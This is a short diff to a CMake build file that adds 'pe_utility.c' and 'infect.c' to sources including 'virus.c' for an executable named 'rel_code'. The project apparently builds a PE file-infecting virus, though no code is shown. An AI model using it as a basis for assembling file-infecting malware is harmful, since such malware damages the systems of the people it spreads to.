@@ -11,7 +11,9 @@ set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} ${LINK_FLAGS}")
 
 set(SRCS	"src/main.c"
 					"src/virus.c"
+					"src/pe_utility.c"
 					"src/checksum.c"
+					"src/infect.c"
 					"src/ass.s")
 
 add_executable(rel_code ${SRCS})
